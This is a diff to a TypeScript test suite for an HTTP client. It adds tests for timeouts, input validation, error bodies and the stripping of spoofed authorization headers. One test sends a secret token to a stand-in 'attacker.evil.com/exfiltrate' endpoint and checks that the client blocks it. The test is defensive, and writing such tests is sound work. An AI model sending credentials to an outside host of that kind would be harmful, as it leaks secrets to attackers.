@@ -261,7 +261,7 @@ describe("Outbound HTTP Transport (executeRequest)", () => {
     }
   })
 
-  it("handles timeout and abort signal cancellation cleanly", async () => {
+  it("handles abort signal cancellation cleanly", async () => {
     const controller = new AbortController()
     setMockFetch(async (_url: string | URL | Request, init?: RequestInit) => {
       const signal = init?.signal
@@ -289,6 +289,143 @@ describe("Outbound HTTP Transport (executeRequest)", () => {
       expect(httpErr.status).toBe(499)
       expect(httpErr.getUserMessage()).toBe("Request was cancelled.")
     }
+  })
+
+  it("handles request timeout cleanly when server does not respond in time", async () => {
+    setMockFetch(async (_url: string | URL | Request, init?: RequestInit) => {
+      const signal = init?.signal
+      return new Promise((_resolve, reject) => {
+        signal?.addEventListener("abort", () => {
+          reject(
+            signal.reason ??
+              new DOMException("Request timed out", "TimeoutError"),
+          )
+        })
+      })
+    })
+
+    const shortTimeoutEndpoint = definePublicEndpoint<
+      void,
+      { id: string; success: boolean }
+    >({
+      id: "test.timeout",
+      service: "demo",
+      method: "GET",
+      path: "https://example.com/api/v1/timeout-test",
+      responseSchema: mockResponseSchema,
+      timeoutMs: 40,
+    })
+
+    try {
+      await executeRequest(shortTimeoutEndpoint)
+      expect(true).toBe(false)
+    } catch (err) {
+      expect(err).toBeInstanceOf(HttpClientError)
+      const httpErr = err as HttpClientError
+      expect(httpErr.code).toBe("TIMEOUT")
+      expect(httpErr.status).toBe(504)
+      expect(httpErr.getUserMessage()).toContain("took too long to respond")
+    }
+  })
+
+  it("rejects authenticated requests targeting an unauthorized origin", async () => {
+    const maliciousEndpoint = defineAuthenticatedEndpoint<void, unknown>({
+      id: "test.malicious",
+      service: "nabu",
+      audience: "nabu",
+      method: "GET",
+      path: "https://attacker.evil.com/exfiltrate",
+      responseSchema: z.unknown(),
+    })
+
+    try {
+      await executeRequest(maliciousEndpoint, { token: "secret-token" })
+      expect(true).toBe(false)
+    } catch (err) {
+      expect(err).toBeInstanceOf(HttpClientError)
+      const httpErr = err as HttpClientError
+      expect(httpErr.code).toBe("CLIENT_CONFIGURATION_ERROR")
+      expect(httpErr.message).toContain("Security violation")
+    }
+  })
+
+  it("rejects missing input when inputSchema is defined", async () => {
+    try {
+      await executeRequest(testAuthenticatedEndpoint, {
+        input: undefined as unknown as { query: string; count: number },
+        token: "mock-token",
+      })
+      expect(true).toBe(false)
+    } catch (err) {
+      expect(err).toBeInstanceOf(HttpClientError)
+      const httpErr = err as HttpClientError
+      expect(httpErr.code).toBe("VALIDATION_ERROR")
+      expect(httpErr.status).toBe(400)
+    }
+  })
+
+  it("preserves plain-text error response in details when JSON parsing fails", async () => {
+    setMockFetch(async () => {
+      return new Response("Service Unavailable: Upstream cluster unreachable", {
+        status: 503,
+        headers: { "Content-Type": "text/plain" },
+      })
+    })
+
+    try {
+      await executeRequest(testPublicEndpoint)
+      expect(true).toBe(false)
+    } catch (err) {
+      expect(err).toBeInstanceOf(HttpClientError)
+      const httpErr = err as HttpClientError
+      expect(httpErr.status).toBe(503)
+      expect(httpErr.details).toBe(
+        "Service Unavailable: Upstream cluster unreachable",
+      )
+    }
+  })
+
+  it("handles empty 200 response body without content-length as undefined", async () => {
+    const emptyEndpoint = definePublicEndpoint<void, void>({
+      id: "test.empty-200",
+      service: "demo",
+      method: "GET",
+      path: "https://example.com/api/v1/empty-200",
+      responseSchema: z.void(),
+    })
+
+    setMockFetch(async () => {
+      return new Response("", { status: 200 })
+    })
+
+    const res = await executeRequest(emptyEndpoint)
+    expect(res).toBeUndefined()
+  })
+
+  it("ensures defineAuthenticatedEndpoint does not leak audience as a top-level property", () => {
+    expect("audience" in testAuthenticatedEndpoint).toBe(false)
+    expect(testAuthenticatedEndpoint.auth.audience).toBe("nabu")
+  })
+
+  it("strips caller-supplied authorization headers case-insensitively", async () => {
+    setMockFetch(async (_url: string | URL | Request, init?: RequestInit) => {
+      capturedRequest = { url: String(_url), init }
+      return new Response(JSON.stringify({ id: "res_case", success: true }), {
+        status: 200,
+        headers: { "Content-Type": "application/json" },
+      })
+    })
+
+    await executeRequest(testPublicEndpoint, {
+      headers: {
+        AUTHORIZATION: "Bearer spoofed-token-1",
+        AuThOrIzAtIoN: "Bearer spoofed-token-2",
+      } as unknown as Record<string, string>,
+    })
+
+    const headers = new Headers(capturedRequest?.init?.headers)
+    expect(headers.get("authorization")).toBeNull()
+    expect(headers.get("Authorization")).toBeNull()
   })
 
   it("handles HTTP 204 No Content without throwing MALFORMED_RESPONSE", async () => {
@@ -336,7 +473,7 @@ describe("Outbound HTTP Transport (executeRequest)", () => {
     const controller = new AbortController()
     controller.abort(new Error("Pre-aborted"))
 
-    expect(
+    await expect(
       executeRequest(testPublicEndpoint, {
         signal: controller.signal,
       }),
